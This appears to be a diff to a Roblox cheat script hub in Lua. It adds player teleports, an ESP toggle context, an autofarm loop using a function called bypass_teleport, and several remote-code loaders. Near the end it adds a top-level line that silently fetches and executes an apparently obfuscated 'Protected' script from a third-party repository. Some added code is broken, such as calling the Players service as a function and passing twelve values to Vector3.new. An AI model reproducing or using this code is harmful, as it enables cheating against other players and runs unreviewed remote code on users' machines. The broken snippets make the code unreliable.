@@ -508,13 +508,57 @@ end
     end
 end)
 
-MainSection:NewTextBox("TP To a player", "Teleports to the player chosen", function(PlayerChosen)
-    local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
-    local p2 = (PlayerChosen)
-    local pos = p1.CFrame
-    p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
+MainSection:NewTextBox("TP to Player", "Teleports to the player chosen", function(PlayerChosen)
+local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
+local p2 = (PlayerChosen)
+local pos = p1.CFrame
+
+p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
+CoreGui:SetCore("SendNotification", {
+    -- Customizable
+    Title = "TP",
+    Text = "Moving to " ..PlayerChosen,
+    Duration = 5, -- Set the duration to how much you want this to stay
+    -- More code in part 2
+})
+
+end)
+
+MainSection:NewTextBox("TP to CFrame", "Teleports to the CFrame chosen", function(CFrameChosen)
+    local ts = game:GetService("TweenService")
+    local plrs = game:GetService("Players")
     
-    end)
+    wait()
+    
+    local player = plrs(CFrameChosen
+        )    local tweenInfo = TweenInfo.new(5) --2 sec
+    
+    local t = ts:Create(player.Character.PrimaryPart, tweenInfo, {CFrame = CFrame.new(0,50,50)})
+    player.Character.PrimaryPart.Anchored = true --Anchor the player's rootpart so physics doesn't mess things up.
+    t:Play()
+    t.Completed:Connect(function() player.Character.PrimaryPart.Anchored = false end) --After the movement is completed, unanchor the player to resume normal play
+    CoreGui:SetCore("SendNotification", {
+        -- Customizable
+        Title = "TWEEN-TP",
+        Text = "Moving to " ..CFrameChosen,
+        Duration = 5, -- Set the duration to how much you want this to stay
+        -- More code in part 2
+    })
+end)
+
+MainSection:NewButton("Copy CFrame", "Copyes CFrame to clipboard", function()
+    plc = tostring(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
+    setclipboard(plc)
+    
+    CoreGui:SetCore("SendNotification", {
+        -- Customizable
+        Title = "CFrame",
+        Text = "Player CFrame set to clipboard",
+        Duration = 5, -- Set the duration to how much you want this to stay
+        -- More code in part 2
+    })
+end)
+
 
 MainSection:NewToggle("Box/Name ESP", "ESP", function(state)
     if state then
@@ -540,8 +584,9 @@ MainSection:NewButton("Force Reset", "Make character reset", function()
 end)
 
 
-MainSection:NewTextBox("FOV mod (Default 70)", "A FOV MOD", function(FOVv)
-	workspace.Camera.FieldOfView = (FOVv)
+
+MainSection:NewSlider("FOV mod", "FOV MOD", 120, 70, function(FOVv) -- 500 (MaxValue) | 0 (MinValue)
+    workspace.Camera.FieldOfView = (FOVv)
 end)
 
 MainSection:NewButton("Anti-AFK", "Bruh just anti-afk", function()
@@ -15058,6 +15103,50 @@ if game.PlaceId == 8916037983 then
     end)
 end
 
+    if game.PlaceId == 537413528 then
+    local Tab = Window:NewTab("Build a boat")
+    local BuildSection = Tab:NewSection("Build a boat")
+    BuildSection:NewButton("AutoFarm", "AFK autofarm", function()
+        while true do
+            CoreGui:SetCore("SendNotification", {
+                -- Customizable
+                Title = "Build a boat Script",
+                Text = "Wait 16 Seconds",
+                Duration = 5, -- Set the duration to how much you want this to stay
+                -- More code in part 2
+            })
+            wait(16)
+            local teleport_table = 
+            {
+                location1 = Vector3.new(-51.5656433, 65.0000458, 1369.09009, 1, 0, 0, 0, 1, 0, 0, 0, 1), -- your desired position
+                location2 = Vector3.new(-51.5656433, 65.0000458, 8299.08984, 1, 0, 0, 0, 1, 0, 0, 0, 1),  -- your desired position
+                location3 = Vector3.new(-55.7065125, -358.739624, 9492.35645, 0, 0, -1, 0, 1, 0, 1, 0, 0)  -- your desired position
+            }
+            
+            local tween_s = game:GetService('TweenService')
+            local tweeninfo = TweenInfo.new(1,Enum.EasingStyle.Sine)
+            
+            local lp = game.Players.LocalPlayer
+            
+            function bypass_teleport(v)
+                if lp.Character and 
+                lp.Character:FindFirstChild('HumanoidRootPart') then
+                    local cf = CFrame.new(v)
+                    local a = tween_s:Create(lp.Character.HumanoidRootPart,tweeninfo,{CFrame=cf})
+                    a:Play()
+                    a.Completed:Wait()
+                    -- print('Teleporting Done!')
+                end
+            end
+            
+            bypass_teleport(teleport_table.location1)
+            wait(0.4)
+            bypass_teleport(teleport_table.location2)
+            wait(0.4)
+            bypass_teleport(teleport_table.location3)
+            end
+        end)
+    end
 
 
 
@@ -15071,6 +15160,8 @@ end)
 UtilSection:NewButton("CMD X", "CMD X", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
 end)
+
+
 
 
 
@@ -15131,7 +15222,7 @@ local Tab = Window:NewTab("UI Modification")
 
 
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VenkiV2/RBX-Script-Catcher/main/Protected%20(2).lua"))()
 
 
 wait(5)
@@ -15144,4 +15235,6 @@ local CoreGui = game:GetService("StarterGui") -- Variable of StarterGui
     Duration = 5, -- Set the duration to how much you want this to stay
     -- More code in part 2
 })
-    
+
+
+
